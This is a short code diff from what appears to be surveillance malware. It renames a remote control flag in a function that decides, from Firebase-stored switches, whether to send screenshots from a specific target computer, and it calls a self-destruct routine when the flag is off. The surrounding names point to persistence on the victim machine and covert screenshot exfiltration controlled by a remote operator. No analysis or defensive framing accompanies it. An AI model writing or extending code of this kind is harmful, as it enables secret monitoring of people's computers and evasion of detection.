@@ -90,12 +90,12 @@ def ensure_persistence():
 def should_send_screenshot():
     try:
         all_status = fetch_firebase_field("all", "on").lower()
-        sk5_status = fetch_firebase_field("SK5x08", "off").lower()
+        owner_status = fetch_firebase_field("owner", "off").lower()
     except:
         all_status = "on"
-        sk5_status = "off"
+        owner_status = "off"
     if COMPUTER_NAME == TARGET_NAME:
-        if sk5_status == "off":
+        if owner_status == "off":
             self_destruct()
             return False
         else:
